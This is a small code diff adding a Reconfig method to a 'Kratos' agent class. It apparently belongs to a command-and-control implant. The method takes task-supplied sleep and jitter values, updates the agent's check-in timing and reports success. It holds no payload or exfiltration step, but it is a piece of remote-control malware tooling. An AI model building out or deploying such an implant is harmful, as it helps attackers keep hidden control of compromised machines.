@@ -28,6 +28,21 @@ void Kratos::exitAgent() {
 	return;
 }
 
+void Kratos::Reconfig() {
+	auto TaskID    = packager->UnPack4( );
+	auto NewSleep  = packager->UnPack4( );
+	auto NewJitter = packager->UnPack4( );
+
+	this->settings.Sleep  = NewSleep;
+	this->settings.Jitter = NewJitter;
+
+	packager->Pack4( TaskID );
+	packager->Pack4( OUTPUT_SUCCESS );
+	packager->Pack4( RECONFIG_SUCCESS );
+	return;
+	
+}
+
 
 void Kratos::Cleanup() {
 	auto LocalFree = this->apis.LocalFree;
@@ -35,4 +50,5 @@ void Kratos::Cleanup() {
 	kratos = NULL;
 	LocalFree( self );
 }
+
 
